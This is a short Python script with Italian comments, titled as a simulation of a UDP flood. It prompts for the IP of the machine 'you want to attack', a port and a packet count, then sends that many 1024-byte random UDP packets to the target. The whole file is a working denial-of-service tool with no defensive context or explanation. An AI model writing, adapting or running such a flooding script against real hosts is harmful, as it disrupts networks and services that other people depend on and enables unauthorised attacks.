#Simulazione di un UDP flood su una macchina target
import socket
import random
SVR_ADDRES=input("Inserisco IP della macchina che vuoi attaccare: ")
SVR_PORT=int(input("Inserisci il numero di porta: "))
n_pacchetti=int(input("Inserisci numero di pacchetti: "))
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)


for i in range(n_pacchetti):
    pacchetto=random.randbytes(1024)
    s.sendto(pacchetto,(SVR_ADDRES,SVR_PORT))
print(f"Sono stati inviati {n_pacchetti} pacchetti")    
s.close()
